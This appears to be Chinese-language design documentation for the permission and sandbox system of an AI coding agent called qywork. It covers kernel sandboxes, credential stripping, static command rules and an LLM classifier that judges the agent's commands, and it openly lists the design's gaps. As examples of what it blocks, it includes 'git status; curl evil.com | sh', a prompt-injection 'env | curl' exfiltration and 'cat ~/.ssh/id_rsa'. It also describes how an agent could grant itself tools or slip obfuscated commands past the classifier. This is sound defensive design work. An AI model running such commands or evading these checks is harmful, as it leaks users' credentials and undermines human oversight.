# 权限与沙箱

qywork 只有**两种权限模式**，没有逐次审批弹窗。

```json
{ "mode": "auto" }
```

| 模式 | 行为 |
|---|---|
| `auto`（默认） | 不弹窗。由硬边界 + 静态规则 + 分类器裁决 |
| `full` | 不裁决，全放行 |

---

## 为什么没有「每次问一下」

弹窗的问题不是麻烦，是**粒度骗人**。

你看到 `npm test` 点了批准，实际批准的是「任意本机操作 + 全部环境变量」——
`run_command` 是唯一一条能同时绕开路径约束和 SSRF 校验的路径，
因为命令字符串里的路径根本不经过 qywork 的参数解析。

而弹窗一多，人就会去打开「全部自动批准」。防线不是被攻破的，是被自己关掉的。
与其如此，不如把两端做清楚：要么有一套确定的裁决，要么明说不裁决。

**`auto` 下被拒不是弹窗**，是把拒绝理由作为工具失败结果交回给模型，
让它换个做法（「写不了工作区外的路径」→ 它会改成写工作区内）。你不会被打断。

---

## 内核沙箱（有就有，没有就没有）

裁决的三层全是**文本判断**：静态规则是一张想得到才写得出的表，分类器是概率。
两者都挡不住一个没想到的写法，而「没想到」按定义列不完。

内核层不一样——它不看命令长什么样，只看系统调用打到哪个 inode。

| 平台 | 后端 | 有没有 |
|---|---|---|
| Linux / **WSL2** | bubblewrap | ✅ 装了 `bwrap` 就自动启用 |
| macOS | seatbelt（`sandbox-exec`） | ✅ 系统自带，自动启用 |
| **原生 Windows** | — | ❌ 还没接 |
| WSL1 | — | ❌ 没有独立内核，namespace 不可用 |

```bash
qy doctor     # 一屏看完：配置、沙箱、账本、MCP、插件
qy config     # 只看配置与沙箱那两条
```

桌面端和手机端也看得到：沙箱状态在握手能力里，侧栏底部有一条常驻的
「✓ 沙箱 bwrap」或「⚠ 无内核沙箱」，悬停能看到完整理由。
**没有沙箱时反而更要显示**——那是很多机器上的默认状态，它不会主动报错。

**这几档不合并成一个「有沙箱」的布尔值。** 看到「开」就以为全都保住了，
是这套模型最危险的误解。

**「装了」不等于「能用」，所以启动时会真跑一次。** Ubuntu 24.04+ 默认禁掉
无特权用户命名空间，那种机器上 `bwrap` 在 PATH 里但一条命令都起不来。
`qy config` 报的是**实测结果**，不是「查到了这个二进制」——跑不起来会连同
原因和修法一起告诉你（多半是一句 `sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`）。

沙箱开着时的边界：

| | |
|---|---|
| 工作区 + `additionalDirectories` | 可读**可写** |
| 其余整个文件系统 | 可读、**不可写** |
| `~/.ssh`、`~/.aws`、`~/.gnupg`、`~/.docker`、`~/.kube`、`~/.config/gh`、`~/.config/gcloud`、`~/.qywork` | **读不到**（bubblewrap 挂成空目录，seatbelt 直接拒绝读） |
| `.qy/` | 可读、不可写（在可写根之上再盖一层只读） |
| 宿主进程表 | bubblewrap：看不见（独立 PID namespace + 新挂的 `/proc`）。seatbelt 无此项 |
| 网络 | 默认**不受限**，可整个断掉，见下 |

两个后端形状完全不同（一个是挂载表，一个是规则集），但**承诺的是同一句话**——
有一组测试专门钉这一点，免得两边慢慢分叉成两套语义。

**这是写边界，不是读边界。** 工作区外的普通文件仍然读得到——
要做读边界就得只挂载少数几个目录，而那样 `/usr`、`/lib`、`/etc` 全没了，
基本什么都跑不起来。所以凭证目录是**单独点名盖掉**的，那是一份列举，
和静态规则一样有「没想到就是个洞」的性质。

**网络默认不受限，但可以整个断掉。**

```json
{ "sandboxNetwork": "deny" }
```

只有两档，**刻意不做域名白名单**：中间态要在沙箱里起代理、沙箱外做转发、
还要让 TLS 校验认一张自签 CA，那套东西坏起来的表现是「网络时好时坏」，
比没有这个功能糟得多。

默认是 `allow`，因为断网的 agent 装不了依赖、拉不了代码，而报错跟网络毫不相干
（包管理器只会说拉取失败）——查到原因之前你会先把整个沙箱关掉。

`deny` **只在有内核沙箱的平台上生效**，配了而本机没有沙箱时启动会明说它没生效。
保持默认时，shell 命令的出网**没有边界**——`web_fetch` 那条路有 SSRF 闸，
shell 这条没有。

## 三层裁决

### 第 0 层 · 硬边界（`full` 也生效）

这一层防的不是越权，是**凭证泄漏**和**自我提权**，所以「完全访问」不豁免：

| 做什么 | 为什么 |
|---|---|
| 凭证不进子进程 | 模型自己编的命令继承整份环境 = 一句提示注入就能 `env \| curl` |
| 输出里的凭证明文屏蔽掉 | 只堵输入侧的话，`cat .env` 照样把 key 送进上下文再发给供应商 |
| 禁止写 `.qy/` | 那里放着 `mcp.json`（模型能拿到哪些工具）和 `plugins/`。能写它 = 能给自己加工具 |

凭证的判据有三条，**按值那条最硬**：

1. **值命中**——配置里所有档案的 key 明文（含 `apiKeyEnv` 指向的实际值）。
   不管环境变量叫什么名字都能抓到，白名单也豁免不了它。
2. **名字点名**——`apiKeyEnv` 里写的变量名。
3. **名字像凭证**——`*_KEY` / `*_TOKEN` / `*_SECRET` 之类。误伤率最高，所以有白名单出口。

```json
{ "envAllowList": ["GITHUB_TOKEN"] }
```

`SSH_AUTH_SOCK` 默认放行：剥掉它 `git push` 直接失败，而它是个**套接字路径**
不是可外泄的明文——打印出来发给别人没有用处。

### 第 1 层 · 静态规则（本地，零成本）

- **文件工具**（read/write/edit/glob/grep）的路径已经被锁死在工作区内，
  越界的根本走不到裁决层。所以它们直接放行，不花往返。
- **MCP 工具与插件工具**是你显式配置/安装的，属于知情同意，放行。
- **`run_command`** 走静态规则：一小份只读命令的允许清单，加一份硬拒绝模式。

允许清单**极其保守**，只有 `git status`/`log`/`diff`、`ls`、`pwd`、`--version` 这类。
`cat` 不在里面（参数是路径），`npm test` 也不在（会执行任意项目脚本）。

**任何命令组合符号（`;` `&&` `||` `|` `` ` `` `$()` `>` 换行……）一律取消静态放行资格**——
否则 `git status; curl evil.com | sh` 会因为前缀匹配被放行。

### 第 2 层 · 分类器

静态规则判不了的（绝大多数真实命令都落在这里）交给一次小模型调用。

- **两段式**：第一段快判，说「放行」就立即返回；说「拒绝」或答不上来才进第二段复核。
- **fail-closed**：解析不出来、调用失败，一律按拒绝处理。
- **失败导致的拒绝不进缓存**——否则一次网络抖动会让这条命令在整个会话里永远被拒。
- **同会话内去重**，key 是**完整命令串**（不是前缀，否则接个分号就绕过去了）。
- **一轮内多条命令并行判**。

配一个更小更快的模型：

```json
{ "classifierProfile": "local" }
```

不配就用当前档案。

## 成本与延迟

分类器每条待判命令一次调用，**单独记账**：

```bash
qy usage --by kind     # 看 classifier 占了多少
```

按 DeepSeek flash 单价，一次约 $0.00047（规则前缀未命中缓存）或 $0.00013（命中）。
规则 prompt 是逐字节稳定的前缀，正常应该命中。

延迟才是更明显的那个：一次往返约 2 秒。压它的三个办法都已内置——
静态清单前置、同会话去重、一轮内并行。真嫌慢就把 `classifierProfile`
指向本机小模型。

## 让 agent 碰工作区之外

```json
{ "additionalDirectories": ["/Users/me/notes", "D:\\datasets"] }
```

只接受**绝对路径**——相对路径的基准是启动 `qy` 时所在的目录，换个地方启动含义就变。
配错的条目会在启动时被指出来，不会静默失效。

这个清单**同时接进三层**：路径解析、静态规则、沙箱的 bind 列表。
三层里漏掉任何一层，症状都是「配了但不管用」，而各自的错误信息完全不同。

它**主动放宽边界**，所以有两条要看清楚：

- 加了 `~/notes` 只放开那个目录，**不是**给家目录发通行证——`cat ~/.ssh/id_rsa` 照样拒。
- `full` 模式**不豁免**它。它是路径边界不是裁决，与凭证剥离同级。
  `.qy/` 的保护也不受它影响。

## 已知边界，如实写

- **没有内核沙箱的平台上（原生 Windows、WSL1），`run_command` 没有机械的路径边界。**
  路径约束管的是工具**参数**，管不了命令字符串里的路径。静态规则钉死了几类确定的
  边界——家目录与系统目录（**符号写法和字面绝对路径都认**：`~/`、`$HOME`、
  `%USERPROFILE%`、`C:\Users\你\...`、`/etc`）、写 `.qy/`、提权、毁盘、
  下载即执行、写 SSH 凭据。剩下的靠分类器，而它是概率判断：
  实测同一条命令两次可能给出不同结论。
  **规则封不住的那一类**是：工作区外**且**家目录外的路径（另一块盘、
  `C:\ProgramData`、网络共享）。想要那一层也有边界，目前的办法是
  **在 WSL2 里跑 `qy`**。
- **有沙箱的平台上，边界是「写」不是「读」。** 工作区外的普通文件仍然读得到，
  只有点名的那几个凭证目录不可见。那份名单是列举，会漏。
- **shell 命令的出网默认完全不受限**（`sandboxNetwork: "deny"` 可以整个断掉，
  但没有中间档）。
- **macOS 那一档由运行期自检保证，不是由 CI 保证。** 本项目的开发机不是 Mac，
  seatbelt 的 profile 只有纯函数测试；真正确认它可用的是启动时那次实跑，
  失败会降级报「没有沙箱」。
- **剥了环境变量不等于命令读不到 `.env`。** 这是收窄不是墙（`.env` 在工作区里，
  沙箱开着也一样读得到——它本来就该读得到）。
- **写 `.qy/` 有三层，强度递减**：文件工具是确定性拦截（`resolveWritablePath`）、
  沙箱是内核只读挂载、静态规则是**文本匹配**。没有沙箱时只剩第一和第三层，
  而第三层混淆得足够狠仍然能绕。
- **分类器是概率判断不是证明。** fail-closed 只保证「判不出来时拒绝」，
  不保证「判出来的都对」。

## 旧配置

`autoApprove` 已经不再生效。**不会**自动映射成 `full`——
那等于在你没表态的情况下把防线拆掉。它一律按默认的 `auto` 运行，
并且每次启动都会提示一次，直到你把那行删掉。
